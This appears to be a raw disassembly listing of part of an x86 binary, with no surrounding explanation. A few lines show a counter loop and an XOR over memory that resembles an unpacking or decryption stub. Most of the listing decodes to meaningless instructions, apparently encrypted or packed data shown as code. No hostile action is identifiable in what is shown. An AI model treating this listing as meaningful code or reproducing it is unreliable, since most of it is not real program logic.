  402876:	jne    0x402885
  40287c:	push   DWORD PTR [ebp-0xc]
  40287f:	call   DWORD PTR ds:0x42e9d8
  402885:	cmp    DWORD PTR ds:0x42e75e,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e75e
  40289a:	dec    eax
  40289b:	mov    ds:0x42e75e,eax
  4028a0:	mov    eax,ds:0x42e75e
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e75e,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	les    eax,FWORD PTR [ecx]
  4028e2:	push   ss
  4028e3:	xor    al,0xe6
  4028e5:	add    edi,DWORD PTR [esi+0x7e]
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	lea    edx,[eax-0x7b]
  4028ef:	lahf   
  4028f0:	push   ecx
  4028f1:	jle    0x402928
  4028f3:	jno    0x40287d
  4028f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028f6:	jl     0x4028ec
  4028f8:	mov    ds:0x3ae217c8,al
  4028fd:	xchg   DWORD PTR [ecx+0x26],esp
  402900:	mov    ebx,0x1efcde76
  402905:	sahf   
  402906:	jmp    0x4028c8
  402908:	jp     0x4028aa
  40290a:	loope  0x40294a
  40290c:	xor    BYTE PTR [ebp+0x219922b6],0x33
  402913:	sbb    DWORD PTR [ebp-0x5c425861],ebx
  402919:	jp     0x40290f
  40291b:	jae    0x402965
  40291d:	sub    al,0x81
  40291f:	adc    BYTE PTR [ebx-0x38fb547d],cl
  402925:	mov    edi,0xebcdd899
  40292a:	cmc    
  40292b:	out    dx,eax
  40292c:	sub    BYTE PTR [ecx-0x19dff5d3],al
  402932:	mov    bl,dl
  402934:	lahf   
  402935:	add    BYTE PTR [esi],0x9b
  402938:	add    DWORD PTR [esi],edi
  40293a:	call   0x6eb3:0xb9d9ddd9
  402941:	mov    ebx,edx
  402943:	mov    WORD PTR [ebp+0x55],bp
  402947:	test   DWORD PTR [edx],esp
  402949:	std    
  40294a:	add    esi,ebx
  40294c:	adc    eax,0x80e1d0c3
  402951:	stos   DWORD PTR es:[edi],eax
  402952:	and    DWORD PTR [ebx+ecx*8+0x76],ecx
  402956:	ret    0x7f9b
  402959:	mov    DWORD PTR [ecx],esi
  40295b:	out    dx,al
  40295c:	or     dh,BYTE PTR [edi]
  40295e:	dec    ecx
  40295f:	repz adc BYTE PTR [esi+0x3cececb2],ah
  402966:	push   ecx
  402967:	push   edi
  402968:	inc    eax
  402969:	sbb    eax,0x8d2fa038
  40296e:	(bad)  
  40296f:	in     eax,dx
  402970:	das    
  402971:	fwait
  402972:	push   esp
  402973:	cmp    BYTE PTR [eax],bl
  402975:	inc    esp
  402976:	adc    BYTE PTR [esi+0x4a23308d],dh
  40297c:	dec    ebx
  40297d:	jnp    0x402938
  40297f:	jle    0x402965
  402981:	es dec edi
  402983:	xor    BYTE PTR [ebx-0x5c],dl
  402986:	dec    esp
  402987:	mov    eax,ds:0xd3ec2bf3
  40298c:	dec    eax
  40298d:	push   ecx
  40298e:	jae    0x402941
  402990:	pop    ds
  402991:	aas    
  402992:	or     eax,0x183d5e6
  402997:	jle    0x40296d
  402999:	jnp    0x402983
  40299b:	pop    es
  40299c:	call   0x71c4:0x526c3f8d
  4029a3:	mov    ?,WORD PTR [esi+0x1f6eb6c0]
  4029a9:	add    dl,BYTE PTR [edi-0x3f9e66b0]
  4029af:	inc    eax
  4029b0:	xchg   ebp,eax
  4029b1:	sub    BYTE PTR [edx+ebp*8+0x6e835a07],dl
  4029b8:	mov    ebx,0x2d114c45
  4029bd:	das    
  4029be:	jge    0x402976
  4029c0:	add    esp,DWORD PTR [ebx+0x34]
  4029c3:	or     al,0x4e
  4029c5:	inc    ecx
  4029c6:	push   ds
  4029c7:	in     eax,dx
  4029c8:	pop    edi
  4029c9:	sahf   
  4029ca:	or     edx,edi
  4029cc:	jl     0x402955
  4029ce:	jecxz  0x4029d1
  4029d0:	ret    0xd5bb
  4029d3:	into   
  4029d4:	(bad)
  4029d7:	xchg   ebp,eax
  4029d8:	pop    edi
  4029d9:	(bad)  
  4029da:	mov    eax,ds:0x95d45c4e
  4029df:	xchg   edi,eax
  4029e0:	lods   al,BYTE PTR ds:[esi]
  4029e1:	jns    0x402a3d
  4029e3:	sbb    al,0x93
  4029e5:	outs   dx,DWORD PTR ds:[esi]
  4029e6:	dec    ebx
  4029e7:	or     DWORD PTR [ebx-0x4e],ebp
  4029ea:	jle    0x402a48
  4029ec:	xchg   edx,eax
  4029ed:	jnp    0x402a1b
  4029ef:	adc    DWORD PTR [ebx-0x2b],edi
  4029f2:	and    ecx,edx
  4029f4:	rol    DWORD PTR [ebp+0x2363868c],1
  4029fa:	and    esi,DWORD PTR [esi+0x16]
  4029fd:	ds or  eax,0xba781014
  402a03:	xchg   esp,eax
  402a04:	iret   
  402a05:	push   edx
  402a06:	cmp    eax,DWORD PTR [eax+0x49]
  402a09:	and    al,0x44
  402a0b:	in     al,dx
  402a0c:	cs aam 0x94
  402a0f:	div    WORD PTR [edi]
  402a12:	and    al,0x10
  402a14:	cmp    ebx,DWORD PTR [eax-0x5d]
  402a17:	popa   
  402a18:	jg     0x4029d4
  402a1a:	jmp    0x60c5:0x53cc0dbc
  402a21:	iret   
  402a22:	jb     0x402a5c
  402a24:	clc    
  402a25:	add    BYTE PTR [ecx+0x6c],0xb1
  402a29:	cli    
  402a2a:	test   eax,0xe9d40b47
  402a2f:	or     cl,BYTE PTR [ecx+0x59]
  402a32:	mov    al,0xc8
  402a34:	inc    ecx
  402a35:	sbb    BYTE PTR [ecx],al
  402a37:	add    BYTE PTR [ebp-0x362c4fb7],ah
  402a3d:	add    BYTE PTR [edx-0x1f],bh
  402a40:	shl    BYTE PTR [esi+0x46fcbeef],cl
  402a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a47:	clc    
  402a48:	sub    al,0x47
  402a4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a4b:	inc    edx
  402a4c:	sub    al,0xf
  402a4e:	test   al,0x64
  402a50:	mov    ch,0x94
  402a52:	(bad)  
  402a53:	test   DWORD PTR [edx],0x6849cb36
  402a59:	or     DWORD PTR [ebp+0x6],esp
  402a5c:	add    BYTE PTR [ecx],dl
  402a5e:	and    eax,0x5b75f412
  402a63:	rol    dl,cl
  402a65:	push   edi
  402a66:	ja     0x402a30
  402a68:	push   esp
  402a69:	mov    esp,0xdc083506
  402a6e:	xchg   BYTE PTR [edi+0x30],ah
  402a71:	ss or  eax,0xdb3e5ab6
  402a77:	sbb    al,0xa
  402a79:	push   0xffffffe0
  402a7b:	cmp    esi,DWORD PTR [ebx+edi*4+0x32811f64]
  402a82:	fdiv   QWORD PTR [ebp-0x69]
  402a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a86:	ins    DWORD PTR es:[di],dx
  402a88:	jecxz  0x402a32
  402a8a:	jbe    0x402a25
  402a8c:	sar    al,cl
  402a8e:	nop
  402a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a90:	lock mov eax,0x4bbd11a8
  402a96:	dec    esi
  402a97:	and    bl,BYTE PTR [ecx]
  402a99:	in     eax,0xe8
  402a9b:	stos   DWORD PTR es:[edi],eax
  402a9c:	adc    al,0x30
  402a9e:	push   ecx
  402a9f:	mov    esi,0x3b7ad2f3
  402aa4:	aam    0xb6
  402aa6:	sub    eax,0xc42547b0
  402aab:	jmp    0xec68a6df
  402ab0:	adc    al,0x81
  402ab2:	scas   eax,DWORD PTR es:[edi]
  402ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab4:	sbb    DWORD PTR [ebx],esp
  402ab6:	xchg   ebp,eax
  402ab7:	pushf  
  402ab8:	lock jge 0x402ab2
  402abb:	daa    
  402abc:	adc    DWORD PTR [ebx+0x5e],edx
  402abf:	retf   
  402ac0:	mov    ecx,0xa673667d
  402ac5:	dec    edx
  402ac6:	cli    
  402ac7:	or     al,0xfc
  402ac9:	jmp    ebp
  402acb:	and    BYTE PTR [edi+0x20],ch
  402ace:	pop    edi
  402acf:	sub    bl,BYTE PTR [edi-0x37]
  402ad2:	xor    cl,cl
  402ad4:	mov    cl,0x14
  402ad6:	inc    BYTE PTR [edx-0x534394b4]
  402adc:	fadd   QWORD PTR [edx-0x65c40a08]
  402ae2:	push   esi
  402ae3:	aam    0xb5
  402ae5:	fcos   
  402ae7:	cmp    BYTE PTR [esi+eiz*2],ah
  402aea:	repz lahf 
  402aec:	js     0x402b37
  402aee:	xor    eax,0x301e069
  402af3:	cmp    bl,BYTE PTR [ecx]
  402af5:	lahf   
  402af6:	xor    BYTE PTR [esi+0x52f50f48],bl
  402afc:	jge    0x402b7b
  402afe:	sub    ah,0xc4
  402b01:	push   edi
  402b02:	adc    ah,0xe2
  402b05:	mov    ebx,0xe33c951f
  402b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b0b:	push   ebp
  402b0c:	mov    dl,0x48
  402b0e:	and    DWORD PTR [esi],esi
  402b10:	or     eax,0xfa703731
  402b15:	scas   al,BYTE PTR es:[edi]
  402b16:	jecxz  0x402b34
  402b18:	inc    esi
  402b19:	jns    0x402b21
  402b1b:	adc    esi,ebp
  402b1d:	imul   edi,DWORD PTR [esi+0x65],0xffffffd0
  402b21:	mov    bl,0x8b
  402b23:	ret    
  402b24:	pop    edi
  402b25:	test   DWORD PTR [esi-0x33],0x8642ebef
  402b2c:	jae    0x402b77
  402b2e:	add    edx,esi
  402b30:	in     al,dx
  402b31:	retf   0x7d5a
  402b34:	sbb    eax,0x632f5920
  402b39:	pop    esi
  402b3a:	(bad)  
  402b3b:	mul    DWORD PTR ds:0xbfe2956b
  402b41:	pusha  
  402b42:	loopne 0x402ad2
  402b44:	lds    edx,FWORD PTR [ecx]
  402b46:	aam    0x35
  402b48:	xchg   ecx,eax
  402b49:	sub    edi,edx
  402b4b:	in     eax,dx
  402b4c:	scas   al,BYTE PTR es:[edi]
  402b4d:	in     al,0xca
  402b4f:	adc    BYTE PTR [ecx+0x3d337e58],bh
  402b55:	jmp    0xfd39d83e
  402b5a:	xchg   esp,eax
  402b5b:	ret    
  402b5c:	inc    esp
  402b5d:	in     al,dx
  402b5e:	imul   ebp,DWORD PTR [edi+0x59f25144],0xffffffc9
  402b65:	or     DWORD PTR [edx],ebx
  402b67:	fld    DWORD PTR [ebx]
  402b69:	xor    ch,BYTE PTR [edi-0x375279fb]
  402b6f:	ss inc edi
  402b71:	ror    BYTE PTR [esi-0x1],0xa1
  402b75:	pop    es
  402b76:	or     BYTE PTR [esi+0x3e],dh
  402b79:	inc    edx
  402b7a:	fnsetpm(287 only) 
  402b7c:	jne    0x402b42
  402b7e:	mov    esi,0x258edae2
  402b83:	jns    0x402bd8
  402b85:	pop    ebp
  402b86:	js     0x402bb0
  402b88:	xor    ch,BYTE PTR [esi-0x6e]
  402b8b:	sbb    BYTE PTR [ebx],cl
  402b8d:	sbb    BYTE PTR [edx],dh
  402b8f:	iret   
  402b90:	(bad)  [esi]
  402b92:	mov    ah,bl
  402b94:	sbb    eax,0xee21ee8d
  402b99:	pop    ebp
  402b9a:	stc    
  402b9b:	lods   al,BYTE PTR ss:[esi]
  402b9d:	fadd   DWORD PTR [edx+0x193e3baa]
  402ba3:	(bad)  
  402ba5:	cdq    
  402ba6:	int3   
  402ba7:	cmp    dl,BYTE PTR [esi+0x6b4567e5]
  402bad:	pushf  
  402bae:	mov    ch,0xa3
  402bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bb1:	adc    al,0xee
  402bb3:	jo     0x402ba5
  402bb5:	push   0x39385ead
  402bba:	stc    
  402bbb:	repz add al,0xe
  402bbe:	cmp    al,0xff
  402bc0:	(bad)  
  402bc2:	mov    cl,al
  402bc4:	mov    ebx,0x8ac36318
  402bc9:	in     al,dx
  402bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bcb:	dec    BYTE PTR [edx+ecx*8]
  402bce:	mov    al,ds:0x7857dcea
  402bd3:	out    0x18,al
  402bd5:	or     BYTE PTR [eax+0x79],ah
  402bd8:	pushf  
  402bd9:	ins    DWORD PTR es:[edi],dx
  402bda:	div    DWORD PTR [edi]
  402bdc:	shl    BYTE PTR [ebx],cl
  402bde:	dec    esi
  402bdf:	dec    esi
  402be0:	in     al,dx
  402be1:	push   cs
  402be2:	xor    BYTE PTR [ecx],0xc6
  402be5:	xchg   esi,eax
  402be6:	mov    esi,eax
  402be8:	dec    ecx
  402be9:	cmp    edx,DWORD PTR [edx+0x3e]
  402bec:	das    
  402bed:	mov    ds:0x5b2f9825,al
  402bf2:	pop    ds
  402bf3:	add    DWORD PTR [ebx+ecx*8+0x5b],ebx
  402bf7:	jmp    0x4659:0x679f1567
  402bfe:	mov    ch,0x94
  402c00:	cmp    DWORD PTR [eax-0x34],edi
  402c03:	inc    esi
  402c04:	push   edx
  402c05:	jae    0x402c5e
  402c07:	inc    eax
  402c08:	dec    ecx
  402c09:	pop    ebp
  402c0a:	call   0x2fd4:0x5df60f63
  402c11:	push   ss
  402c12:	dec    ebx
  402c13:	pop    ecx
  402c14:	sbb    al,0xe
  402c16:	idiv   bl
  402c18:	in     al,dx
  402c19:	mov    dh,0x6d
  402c1b:	cmp    DWORD PTR [edi-0x2d358888],0xffffffbc
  402c22:	sub    edi,DWORD PTR [edi+0x4e97bed0]
  402c28:	ss push cs
  402c2a:	push   ss
  402c2b:	mov    WORD PTR [esp+ebx*1-0x4ac553c2],gs
  402c32:	pop    ss
  402c33:	jne    0x402c9f
  402c35:	mov    edx,0xda56f1ed
  402c3a:	adc    cl,BYTE PTR ss:[ebx+0x5d85ff18]
  402c41:	pushf  
  402c42:	lds    edx,FWORD PTR [eax+0x5bbb5bcd]
  402c48:	sub    eax,0x3168b3ee
  402c4d:	stos   BYTE PTR es:[edi],al
  402c4e:	cli    
  402c4f:	sar    BYTE PTR [eax+0x628c5559],cl
  402c55:	mov    ah,0x8d
  402c57:	stc    
  402c58:	imul   ecx,DWORD PTR [edx-0x784d4f50],0x1de2aede
  402c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c63:	xchg   esp,eax
  402c64:	sahf   
  402c65:	idiv   esp
  402c67:	sbb    BYTE PTR [edi],cl
  402c69:	cmp    BYTE PTR [ebx+0x5a],0x9d
  402c6d:	mov    bl,0xee
  402c6f:	xlat   BYTE PTR ds:[ebx]
  402c70:	sar    DWORD PTR [edi-0x777ef689],1
  402c76:	mov    eax,0x21498f0b
  402c7b:	xchg   edx,eax
  402c7c:	push   ebp
  402c7d:	jmp    0x402c89
  402c7f:	adc    al,0x8b
  402c81:	inc    ebp
  402c82:	lock and DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	test   al,0x72
  402cc2:	in     al,dx
  402cc3:	or     eax,0x7e7e070a
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	xchg   ebx,eax
  402ccd:	adc    ah,BYTE PTR [esi]
  402ccf:	lahf   
  402cd0:	and    BYTE PTR [esi+0x5ecc959f],bh
  402cd6:	jnp    0x402c6b
  402cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cd9:	sahf   
  402cda:	pop    ecx
  402cdb:	sub    bh,BYTE PTR [eax]
  402cdd:	jge    0x402c9c
  402cdf:	pop    ds
  402ce0:	sbb    BYTE PTR [ebx-0x23],al
  402ce3:	or     eax,0xfdf0e73e
  402ce8:	(bad)  
  402cea:	lea    eax,[ebp+0x7f]
  402ced:	or     eax,0xa407abc3
  402cf2:	jecxz  0x402d3b
  402cf4:	(bad)  
  402cf5:	push   ss
  402cf6:	xchg   DWORD PTR [ecx-0x12a48ec2],edx
  402cfc:	jg     0x402d09
  402cfe:	(bad)  
  402cff:	jmp    0x4f41099c
  402d04:	jno    0x402d17
  402d06:	jno    0x402ce1
  402d08:	(bad)  
  402d0a:	jp     0x402d54
  402d0c:	mov    WORD PTR [ecx+0x14ba6b00],?
  402d12:	imul   eax,ebp,0xa4d2c12d
  402d18:	pop    esi
  402d19:	sub    esp,DWORD PTR [edi+ebp*8+0x5e175968]
  402d20:	cld    
  402d21:	pop    ds
  402d22:	adc    DWORD PTR [ecx-0x255cae1c],ecx
  402d28:	and    BYTE PTR [eax+0x2],cl
  402d2b:	inc    esp
  402d2c:	mov    al,ds:0x8e5b2393
  402d31:	(bad)  
  402d32:	xor    eax,DWORD PTR [edx]
  402d34:	loopne 0x402d0f
  402d36:	adc    DWORD PTR [ebp-0x7a],eax
  402d39:	pop    es
  402d3a:	cdq    
  402d3b:	jmp    0x16ef:0xbfeffc47
  402d42:	sbb    edi,DWORD PTR [eax+ecx*8]
  402d45:	sbb    ecx,esp
  402d47:	dec    ebp
  402d48:	ss mov cl,0xb
  402d4b:	mov    es,WORD PTR [edi]
  402d4d:	lods   al,BYTE PTR ds:[esi]
  402d4e:	push   ebx
  402d4f:	cwde   
  402d50:	je     0x402cfb
  402d52:	cwde   
  402d53:	jmp    0x5696:0xcb5d7bfb
  402d5a:	jns    0x402d65
  402d5c:	adc    al,0x57
  402d5e:	mov    ch,0xb6
  402d60:	sub    DWORD PTR [ebp+0x1736edf1],ebx
  402d66:	popa   
  402d67:	mov    di,0x5291
  402d6b:	jnp    0x402ced
  402d6d:	or     eax,0x8745c2aa
  402d72:	pop    eax
  402d73:	mov    bl,0xe1
  402d75:	fcmovu st,st(3)
  402d77:	xor    DWORD PTR [ebp-0x3b],eax
  402d7a:	jb     0x402dd1
  402d7c:	xor    al,0x5d
  402d7e:	dec    esp
  402d7f:	stc    
  402d80:	mov    edi,0xd8d4b6cb
  402d85:	xchg   ecx,eax
  402d86:	repz cmp BYTE PTR [edi+0x73],al
  402d8a:	sbb    eax,0xf8b7f078
  402d8f:	retf   0x9262
  402d92:	jmp    0x5b7c:0x28b4e05b
  402d99:	mov    eax,0x56208803
  402d9e:	dec    ecx
  402d9f:	mov    al,0x65
  402da1:	or     al,0x22
  402da4:	sub    al,0x20
  402da6:	(bad)  
  402da7:	sti    
  402da8:	mov    bh,0xfe
  402daa:	sbb    eax,0x4dd235a8
  402daf:	je     0x402daf
  402db1:	cmp    esi,DWORD PTR [ecx-0x2c]
  402db4:	inc    esp
  402db5:	pop    eax
  402db6:	pop    esp
  402db7:	jno    0x402de0
  402db9:	es (bad) 
  402dbb:	(bad)  [esi-0x2a]
  402dbe:	jno    0x402ddb
  402dc0:	inc    esi
  402dc1:	mov    bh,0x3a
  402dc3:	inc    edi
  402dc4:	retf   
  402dc5:	jns    0x402ddc
  402dc7:	fild   WORD PTR gs:[eax-0x46956161]
  402dce:	add    eax,0xa869917c
  402dd3:	xor    BYTE PTR [edi],cl
  402dd5:	sbb    ebx,DWORD PTR [eax+edi*4-0x45]
  402dd9:	mov    cl,0x8a
  402ddb:	mov    eax,ebp
  402ddd:	xchg   ebx,eax
  402dde:	dec    edi
  402ddf:	shr    BYTE PTR [ebx],0xde
  402de2:	sub    ebx,edi
  402de4:	push   cs
  402de5:	retf   0x7711
  402de8:	mov    ds:0x617c3f60,al
  402ded:	or     DWORD PTR [ecx-0x2e8d3085],ebx
  402df3:	jo     0x402d86
  402df5:	out    0xa2,eax
  402df7:	and    cl,BYTE PTR ds:0xfb46e90b
  402dfd:	mov    ebp,0xc9f9e5ac
  402e02:	enter  0x420d,0xc8
  402e06:	aam    0xa6
  402e08:	jbe    0x402e77
  402e0a:	add    al,0x43
  402e0c:	push   esi
  402e0d:	push   edx
  402e0e:	jno    0x402e83
  402e10:	lea    eax,[esi]
  402e12:	stos   BYTE PTR es:[edi],al
  402e13:	cmp    DWORD PTR ds:0xa6b8a3f9,edi
  402e19:	sub    al,0x60
  402e1b:	lock xor al,0x74
  402e1e:	push   ecx
  402e1f:	mov    bl,0xf1
  402e21:	out    dx,al
  402e22:	stc    
  402e23:	call   0x63d5a4f1
  402e28:	test   BYTE PTR [eax+eax*8+0x3b],dh
  402e2c:	or     al,0xcd
  402e2e:	lahf   
  402e2f:	mov    ecx,0x6e476230
  402e34:	mov    cl,0x32
  402e36:	xor    DWORD PTR [ebx-0x54],ebp
  402e39:	xor    al,0x1c
  402e3b:	retf   
  402e3c:	stc    
  402e3d:	cli    
  402e3e:	mov    edx,0x3d60c4ad
  402e43:	sbb    al,0x18
  402e45:	fst    QWORD PTR [edi+ebp*8]
  402e48:	mov    ebp,0x328873b
  402e4d:	fsub   st,st(7)
  402e4f:	adc    DWORD PTR [ecx],esp
  402e51:	sbb    eax,0xfcbb6337
  402e56:	arpl   WORD PTR [edi-0x80],si
  402e59:	and    edx,DWORD PTR [eax+eiz*1-0x4c30617c]
  402e60:	test   BYTE PTR [esi-0x5864de3],dh
  402e66:	es (bad) 
  402e68:	popw   es
  402e6a:	pop    eax
  402e6b:	call   0xa4e0:0xcbb544e7
  402e72:	aad    0x12
  402e74:	or     eax,0xf551a14b
  402e79:	call   0x8d47:0x75cb15b5
  402e80:	mov    al,BYTE PTR [edx-0x6685304a]
  402e86:	push   ss
  402e87:	sbb    DWORD PTR [eax-0x73],ebx
  402e8a:	jle    0x402ef9
  402e8c:	ror    DWORD PTR [edi+0x45],0xe6
  402e90:	inc    ebx
  402e91:	inc    esp
  402e92:	cmp    bh,BYTE PTR [eax]
  402e94:	(bad)
  402e98:	push   ecx
  402e99:	mov    WORD PTR [ecx+0x5],es
  402e9c:	out    dx,al
  402e9d:	sub    edi,0x3fe6f275
  402ea3:	xor    al,0x42
  402ea5:	pop    esp
  402ea6:	addr16 ret 0x579f
  402eaa:	push   eax
  402eab:	test   eax,0x3452317d
  402eb0:	cmp    esp,DWORD PTR [eax-0x61]
  402eb3:	retf   0x7d4d
  402eb6:	call   0x9d9552d5
  402ebb:	jge    0x402efb
  402ebd:	mov    ch,0x68
  402ebf:	(bad)  
  402ec0:	jae    0x402e5c
  402ec2:	test   al,0x0
  402ec5:	inc    ebp
  402ec6:	xor    BYTE PTR [eax+0x1],ah
  402ec9:	aas    
  402eca:	mov    eax,ds:0x8492cab9
  402ecf:	add    al,0xb7
  402ed1:	mov    bh,0x58
  402ed3:	xor    edi,DWORD PTR [edx-0x5f]
  402ed6:	xchg   esp,eax
  402ed7:	out    dx,al
  402ed8:	adc    eax,0x3e695c18
  402edd:	loop   0x402eb7
  402edf:	icebp  
  402ee0:	mov    edx,0xbf380c00
  402ee5:	push   ss
  402ee6:	cmp    eax,0xf7ccc84e
  402eeb:	mov    ebx,ebp
  402eed:	and    DWORD PTR [ebx+0x5b],esi
  402ef0:	(bad)  
  402ef1:	or     BYTE PTR [ebp-0x760cfd00],ah
  402ef7:	ret    
  402ef8:	inc    eax
  402ef9:	xlat   BYTE PTR ds:[ebx]
  402efa:	sbb    esi,ecx
  402efc:	mov    bh,0xa
  402efe:	sub    BYTE PTR [ebx],dl
  402f00:	push   ecx
  402f01:	or     eax,0x797fd534
  402f06:	mov    edx,ecx
  402f08:	jle    0x402ea4
  402f0a:	inc    ebx
  402f0b:	xor    DWORD PTR [ebp-0x54aaebe0],ebx
  402f11:	sub    esi,eax
  402f13:	mov    ah,0x16
  402f15:	out    0x84,eax
  402f17:	mov    dh,0xd7
  402f19:	hlt    
  402f1a:	sub    ebx,DWORD PTR [esi+0x2b60708b]
  402f20:	sbb    BYTE PTR [ebx-0x6d],bh
  402f23:	stos   DWORD PTR es:[edi],eax
  402f24:	jmp    0xbce9:0xd723af28
  402f2b:	mov    cl,0xff
  402f2d:	pop    ebp
  402f2e:	ss lock es xor al,0x4b
  402f33:	aaa    
  402f34:	xchg   esi,eax
  402f35:	jno    0x402f6c
  402f37:	int    0xa7
  402f39:	in     al,dx
  402f3a:	adc    DWORD PTR [edi-0x61],esi
  402f3d:	jns    0x402fae
  402f3f:	fidiv  DWORD PTR [esi]
  402f41:	push   edi
  402f42:	inc    ebp
  402f43:	retf   0xd221
  402f46:	out    dx,eax
  402f47:	les    edx,FWORD PTR ds:0x7c8f111e
  402f4d:	rcl    ebp,1
  402f4f:	cmp    DWORD PTR [ebx+0x49],ebx
  402f52:	cld    
  402f53:	ins    DWORD PTR es:[edi],dx
  402f54:	adc    BYTE PTR [esi+eiz*1+0x3e],al
  402f58:	call   0xebe:0x2c96ff0c
  402f5f:	das    
  402f60:	lods   eax,DWORD PTR ds:[esi]
  402f61:	enter  0xcbbb,0xe1
  402f65:	push   0xffffffb6
  402f67:	xor    eax,0x69eb3d47
  402f6c:	cmp    dh,BYTE PTR [edx+0x63ffbaa7]
  402f72:	lods   eax,DWORD PTR ds:[esi]
  402f73:	inc    ecx
  402f74:	ficomp WORD PTR [edi-0x73]
  402f77:	fwait
  402f78:	inc    edi
  402f79:	std    
  402f7a:	cmp    eax,0xd478c93b
  402f7f:	add    ecx,DWORD PTR [ebp+esi*1+0x14]
  402f83:	mov    eax,ds:0xe09bcf89
  402f88:	pushf  
  402f89:	clc    
  402f8a:	mov    eax,0x17713c4f
  402f8f:	jo     0x402fc7
  402f91:	pop    ds
  402f92:	lds    edi,FWORD PTR [ebx+0x3d]
  402f95:	mul    BYTE PTR [edi+0x72]
  402f98:	scas   eax,DWORD PTR es:[edi]
  402f99:	xchg   esp,eax
  402f9a:	fdivrp st(7),st
  402f9c:	xrelease xchg DWORD PTR ds:0x6178fb7b,ebx
  402fa3:	sbb    eax,0x73fc5b1a
  402fa8:	aam    0xa2
  402faa:	cmp    DWORD PTR ds:0xf4040ae2,edi
  402fb0:	fwait
  402fb1:	push   ds
  402fb2:	xchg   ebp,eax
  402fb3:	cli    
  402fb4:	dec    esi
  402fb5:	push   edi
  402fb6:	mov    ds:0x15bc91a4,al
  402fbb:	dec    ebp
  402fbc:	sub    eax,0xc81706a2
  402fc1:	dec    edi
  402fc2:	scas   al,BYTE PTR es:[edi]
  402fc3:	fs mov eax,0xec3333ab
  402fc9:	hlt    
  402fca:	pop    ss
  402fcb:	loope  0x402f9b
  402fcd:	xor    ch,BYTE PTR [edx+0xd]
  402fd0:	and    eax,0x145668fa
  402fd5:	sub    ebp,DWORD PTR [esi+0x59]
  402fd8:	cmp    DWORD PTR [ebx-0xb],esi
  402fdb:	sar    DWORD PTR [ebp+0xce8d95d],1
  402fe1:	js     0x40301b
  402fe3:	inc    edi
  402fe4:	sbb    eax,0x63dcb2f0
  402fe9:	dec    edx
  402fea:	xchg   ecx,eax
  402feb:	adc    eax,0x5eacbda1
  402ff0:	(bad)  
  402ff1:	div    ebx
  402ff3:	mov    al,0x41
  402ff5:	fist   DWORD PTR [bx+di]
  402ff8:	pop    edi
  402ff9:	(bad)  
  402ffa:	mov    eax,0xf3794309
  402fff:	daa    
  403000:	mov    al,ds:0x9dc56107
  403005:	clc    
  403006:	and    DWORD PTR [ebp-0x41],edx
  403009:	xor    BYTE PTR [esi],cl
  40300b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40300c:	inc    edi
  40300d:	stos   DWORD PTR es:[edi],eax
  40300e:	push   eax
  40300f:	fucomp st(0)
  403011:	aaa    
  403012:	lea    ebx,[edx+0x60]
  403015:	ret    0x6fb6
  403018:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403019:	in     eax,0x2f
  40301b:	pop    ds
  40301c:	bnd jae 0x403089
  40301f:	add    esi,edi
  403021:	and    BYTE PTR [eax],ch
  403023:	mov    cl,0x21
  403025:	xchg   ebx,eax
  403026:	dec    edx
  403027:	pop    eax
  403028:	call   0x14d1:0xd40cd98
  40302f:	les    edx,FWORD PTR [edi+ecx*2+0x6a]
  403033:	out    0x3e,eax
  403035:	jmp    0x403028
  403037:	inc    esi
  403038:	pop    ax
  40303a:	js     0x403061
  40303c:	sub    ah,BYTE PTR cs:[edi-0x2c]
  403040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403042:	sub    al,0xc7
  403044:	popa   
  403045:	add    al,0x17
  403047:	and    eax,0xcb8c0fa8
  40304c:	inc    edi
  40304d:	in     al,0x39
  40304f:	xchg   esp,eax
  403050:	arpl   bx,dx
  403052:	jmp    0x45f4:0x219c71
  403059:	retf   
  40305a:	push   edi
  40305b:	fcomp  QWORD PTR [esi+esi*4-0x7499a576]
  403062:	inc    ebp
  403063:	cld    
